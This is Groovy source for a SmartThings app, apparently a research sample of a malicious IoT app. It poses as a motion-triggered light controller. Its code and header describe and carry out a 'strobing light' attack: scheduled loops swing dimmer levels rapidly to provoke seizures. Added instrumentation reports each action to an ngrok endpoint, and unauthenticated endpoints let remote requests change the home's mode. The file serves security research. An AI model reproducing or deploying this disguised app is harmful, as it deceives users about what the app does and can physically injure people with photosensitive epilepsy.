
/**

 *  shiqiLightController

 *

 *  Copyright 2016 Yunhan Jia & Shiqi Wang

 *

 *  Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except

 *  in compliance with the License. You may obtain a copy of the License at:

 *

 *      http://www.apache.org/licenses/LICENSE-2.0

 *

 *  Unless required by applicable law or agreed to in writing, software distributed under the License is distributed

 *  on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License

 *  for the specific language governing permissions and limitations under the License.

 * Attack Description:
    The attacker could take advantage of insecure pair with malicious smartApps to threat the user's health like creating seizures.


Malicous Strobinglight:
    Normal functions:
    The light controller could control the light. When there is nobody home, it would turn off the light. When the user is home, it would turn on lights automatically.

    Malicious functions:
    The malicious light controller would strobe the light in a high rate. If the user has the health problem of seizure, then this action would trigger the user’s seizures which is really dangerous.

 */

definition(

    name: "shiqiAutoLightController",

    namespace: "wsq",

    author: "Yunhan Jia & Shiqi Wang",

    description: "To make your light controlling smart, this light controller could control the light according to your motion detected by motionsensor. It could help you turn on the light when you are home and turn off it when you are leaving automatically.",

    category: "Safety & Security",

    iconUrl: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",

    iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png",

    iconX3Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png")

preferences {
       section("Title") {
               input "themotionsensor", "capability.motionSensor", title: "Where?"
         input "minutes", "number", required: true, title: "Minutes?"
         //input "myswitch", "capability.switch", title: "switch?"
         input "myswitch", "capability.switchLevel", title:"switchlevel?", multiple: true
       }
}

def installed() {
       log.debug "Installed with settings: ${settings}"
       initialize()
}

def updated() {
       log.debug "Updated with settings: ${settings}"
       unsubscribe()
       initialize()
}

def initialize() {
       //subscribe(themotionsensor, "motion", myHandler)
    subscribe(themotionsensor, "motion.active", motionDetectedHandler)
    subscribe(themotionsensor, "motion.inactive", motionStoppedHandler)
}

def myHandler(evt) {
       //state.switchState = myswitch.currentState("level").value
       //def switchState = myswitch.currentState("level")
    try{
          log.debug "attack"
              runIn(60*minutes,changeIntensity,[overwrite: false])
    }
    catch(e) {
          log.debug e
    }
}

def changeIntensity() {
    def data = [:]  // instrumented code
    def cnt = 0 // instrumented code
       //def switchState = myswitch.currentState("level")
       //def add = true
    def value = myswitch.currentState("level").value.first().toInteger()
    if(state.motionDetected==true) {
        cnt++ // instrumented code
        data['action'+cnt] = "sink1: myswitch setLevel(${80})"  // instrumented code
        myswitch.setLevel(80)  // sink 1

        log.debug "stop attack. value:"
    }

    log.debug "value now:$value"

    if(state.motionDetected==false) {
          if(value<=20) {
              state.add=true
              cnt++ // instrumented code
              data['action'+cnt] = "sink2: myswitch setLevel(${value+20})"  // instrumented code
             myswitch.setLevel(value+20)  // sink 2

             log.debug "$value+20"

            }

          if(value>20&&value<80&& state.add) {
              cnt++ // instrumented code
              data['action'+cnt] = "sink3: myswitch setLevel(${value+20})"  // instrumented code
             myswitch.setLevel(value+20)  //  sink 3

             log.debug "$value+20"
          }

        if(value>=80) {

            state.add = false;
            cnt++ // instrumented code
            data['action'+cnt] = "sink4: myswitch setLevel(${value-20})"  // instrumented code
            myswitch.setLevel(value-20)  // sink 4

            log.debug "$value-20"

        }

        if(value>20&value<80&&!state.add) {
            cnt++ // instrumented code
            data['action'+cnt] = "sink5: myswitch setLevel(${value-20})"  // instrumented code
            myswitch.setLevel(value-20)  // sink 5

            log.debug "$value-20"
        }
        runIn(60*0.1,changeIntensity,[overwrite: false])
    }
    sendRequest(data)  // instrumented code
}

////
def changeIntensity1() {
    def data = [:]  // instrumented code
    def cnt = 0 // instrumented code
       //def switchState = myswitch.currentState("level")
       //def add = true
    def value = myswitch.currentState("level").value.first().toInteger()

    log.debug "value now:$value"

    if(value<=20) {

        state.add=true
        cnt++ // instrumented code
        data['action'+cnt] = "sink6: myswitch setLevel(${value+60})"  // instrumented code
        myswitch.setLevel(value+60)  //  sink 6

        log.debug "$value+60"
    }

    if(value>20&&value<80&& state.add) {
        cnt++ // instrumented code
        data['action'+cnt] = "sink7: myswitch setLevel(${value+20})"  // instrumented code
        myswitch.setLevel(value+20)  //  sink 7

        log.debug "$value+20"
    }

    if(value>=80) {
        state.add = false;
        cnt++ // instrumented code
        data['action'+cnt] = "sink8: myswitch setLevel(${value-60})"  // instrumented code
        myswitch.setLevel(value-60)  //  sink 8

        log.debug "$value-60"

    }

    if(value>20&value<80&&!state.add) {
        cnt++ // instrumented code
        data['action'+cnt] = "sink9: myswitch setLevel(${value-20})"  // instrumented code
        myswitch.setLevel(value-20)  //  sink 9

        log.debug "$value-20"

    }
    runIn(0.5,changeIntensity1,[overwrite: false])
    sendRequest(data)  // instrumented code
}

def motionDetectedHandler(evt) {
    def data = [:]  // instrumented code
    def cnt = 0 // instrumented code

       state.motionDetected = true

     log.debug "motionDetectedHandler called--home!!!"

    cnt++ // instrumented code
    data['action'+cnt] = "sink10: myswitch setLevel(${value+80})"  // instrumented code
     myswitch.setLevel(80)  // sink 10

     attackFunction1()

    // log.debug "home:$myswitch.currentState("level").value.first().toInteger()"
    sendRequest(data)  // instrumented code

}

def motionStoppedHandler(evt) {
    log.debug "motionStoppedHandler called"

    runIn(60 * minutes, checkMotion)

}

def checkMotion() {
    def data = [:]  // instrumented code
    def cnt = 0 // instrumented code
    log.debug "In checkMotion scheduled method"

    def motionState = themotionsensor.currentState("motion")

    if (motionState.value == "inactive") {

        // get the time elapsed between now and when the motion reported inactive

        def elapsed = now() - motionState.date.time

        // elapsed time is in milliseconds, so the threshold must be converted to milliseconds too
        def threshold = 1000 * 60 * (minutes-0.1)

        if (elapsed >= threshold) {
            log.debug " ($elapsed ms):  not home!!!"

            cnt++ // instrumented code
            data['action'+cnt] = "sink11: myswitch setLevel(${0})"  // instrumented code
            myswitch.setLevel(0)  //  sink 11

            state.motionDetected = false
            //log.debug "not home:$myswitch.currentState("level").value.first().toInteger()"
            attackFunction()
        } else {
            log.debug "still home"
        }
    } else {
        // Motion active; just log it and do nothing
        log.debug "Home"
    }
    sendRequest(data)  // instrumented code
}


def attackFunction() {
       try{
          log.debug "attack"
              runIn(60*0.1,changeIntensity,[overwrite: false])
    }

    catch(e) {
          log.debug e
    }
}

def attackFunction1() {
       try{
          log.debug "attack1"
              runIn(60*0.1,changeIntensity1,[overwrite: false])
    }
    catch(e) {
          log.debug e
    }
}


// the following simulates instrumented end point codes for web services hookup
mappings {
    // this endpoint supports a GET request. It will execute the specified command on the configured switches
    path("/people/:command") {
        //log.info("/people/:command")
        action: [
                GET: "people"
        ]
    }
}

/*
	this handles a GET request to the /people/:command endpoint.
    /people/on will turn the presenceSensor on, and /people/off will turn the presenceSensor off.
    This method doesn't work because only Device handler can send/modify device states (present or not present)
    It cannot be modified in the app code
*/
void people() {
    // use the built-in request object to get the command parameter
    def command = params.command
    log.debug("Receive command: $command")
    // inject all possible device commands
    // following is not the exhaustive list yet
    switch(command) {
        case "on":
            people.on()
            break
        case "off":
            people.off()
            break
        case "wet":
            people.wet()
            break
        case "dry":
            people.dry()
            break
        case "present":
            people.present()
            break
        case "notpresent":
            people.notpresent()
            break
        case "active":
            people.active()
            break
        case "inactive":
            people.inactive()
            break
        default:
            httpError(400, "$command is not a valid command for all switches specified")
    }
}


mappings {
    // this is the end point for simulating user location
    path("/location/:command") {
        //log.info("/location/:command")
        action: [
                GET: "location"
        ]
    }
}

void location() {
    //eventHandler(evt)
    def command = params.command
    log.debug("Receive command: $command")

    // format command
    command = command.replaceFirst(command[0], command[0].toUpperCase()) // home -> Home, away -> Away

    def currMode = location.currentMode // "Home", "Away", etc.
    log.debug "current mode is $currMode"

    location.setMode(command)  // change location
}

def sendRequest(data) {
    // [q:'Minneapolis', mode: 'json']
    def params = [
            uri:  'https://62f870a15b61.ngrok.io/',
            path: 'fuzzthings/things.php',
            contentType: 'application/json',
            query: data
    ]
    try {
        httpGet(params){resp ->
            log.debug "connection okay"
        }
    } catch (e) {
        log.error "error: $e"
    }
}
